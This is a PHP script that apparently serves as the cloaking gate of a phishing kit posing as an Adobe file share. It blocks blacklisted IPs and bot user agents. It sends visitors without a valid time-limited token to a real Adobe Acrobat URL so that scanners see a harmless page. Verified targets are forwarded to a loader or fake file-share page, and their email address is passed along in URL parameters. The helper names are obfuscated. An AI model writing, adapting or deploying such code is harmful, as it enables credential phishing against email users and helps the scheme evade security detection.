<?php
ini_set('display_errors', 0);
error_reporting(E_ALL);

require_once __DIR__ . '/config_mode.php';
require_once __DIR__ . '/ip_blacklist_loader.php';

if (!function_exists('getVisitorIP')) {
    function getVisitorIP() {
        $server_addr = $_SERVER['SERVER_ADDR'];
        $localhost = '127.0.0.1';
        
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && 
            (($_SERVER['HTTP_CF_CONNECTING_IP']) != $localhost) && 
            (($_SERVER['HTTP_CF_CONNECTING_IP']) != ($server_addr))) {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR']) != $localhost)) {
            $ip = $_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && 
                  (($_SERVER['HTTP_X_FORWARDED_FOR']) != $localhost) && 
                  (($_SERVER['HTTP_X_FORWARDED_FOR']) != ($server_addr))) {
            $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && 
                  (($_SERVER['HTTP_CLIENT_IP']) != $localhost) && 
                  (($_SERVER['HTTP_CLIENT_IP']) != ($server_addr))) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        
        return $ip;
    }
}

$visitor_ip = getVisitorIP();

if (IPBlacklistLoader::isBlacklisted($visitor_ip)) {
    die(header('HTTP/1.1 403 Forbidden'));
}

$VERIFICATION_REQUIRED = true;

if ($VERIFICATION_REQUIRED) {
    $vtoken = $_GET['vtoken'] ?? '';
    $vtime = $_GET['vtime'] ?? '';
    
    if (empty($vtoken) || empty($vtime)) {
        header('Location: https://acrobat.adobe.com/id/urn:aaid:sc:EU:3675e197-77af-4366-a4d8-fc2568aa27d9');
        exit;
    }
    
    if (!preg_match('/^[a-f0-9]{32}$/', $vtoken)) {
        header('Location: https://acrobat.adobe.com/id/urn:aaid:sc:EU:3675e197-77af-4366-a4d8-fc2568aa27d9');
        exit;
    }
    
    if (!is_numeric($vtime) || $vtime > time() || $vtime < (time() - 60)) {
        header('Location: https://acrobat.adobe.com/id/urn:aaid:sc:EU:3675e197-77af-4366-a4d8-fc2568aa27d9');
        exit;
    }
    
    $expected_token = md5('verified:' . $vtime . ':secure_gate_salt');
    
    if ($vtoken !== $expected_token) {
        header('Location: https://acrobat.adobe.com/id/urn:aaid:sc:EU:3675e197-77af-4366-a4d8-fc2568aa27d9');
        exit;
    }
}

if (!function_exists('x9PfbWn2bS')) {
    function x9PfbWn2bS() {
        if(empty($_SERVER['HTTP_USER_AGENT'])) {
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT');
        }
        return $_SERVER['HTTP_USER_AGENT'];
    }
}
$eRf9t9d9 = x9PfbWn2bS();

$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  APP MODE CHECK — Direct mode bypasses file share UI entirely
// ═══════════════════════════════════════════════════════════════════════════
if (defined('APP_MODE') && APP_MODE === 'direct') {
    // Build redirect URL to direct_loader.php preserving all params
    $vtoken = $_GET['vtoken'] ?? '';
    $vtime  = $_GET['vtime']  ?? '';
    $directUrl = 'direct_loader.php?vtoken=' . urlencode($vtoken) . '&vtime=' . urlencode($vtime);

    // Preserve 'ref' param (email in base64 or plain)
    if (!empty($_GET['ref'])) {
        $directUrl .= '&ref=' . urlencode($_GET['ref']);
    }

    // Preserve 'email' param (legacy/fallback)
    if (!empty($_GET['email'])) {
        $directUrl .= '&email=' . urlencode($_GET['email']);
    }

    header('Location: ' . $directUrl, true, 302);
    exit;
}

// ═══════════════════════════════════════════════════════════════════════════
//  FILE SHARE MODE — Redirect to local index.php
// ═══════════════════════════════════════════════════════════════════════════
$queryString = $_SERVER['QUERY_STRING'] ?? '';
$redirectUrl = 'index.php' . ($queryString ? '?' . $queryString : '');

if (headers_sent($file, $line)) {
    // If debug mode is on, we might see this. Fallback to JS redirect.
    echo "<script>window.location.href = '" . addslashes($redirectUrl) . "';</script>";
    die("Redirecting to index.php (Headers already sent in $file on line $line)");
}

header('Location: ' . $redirectUrl, true, 302);
exit;

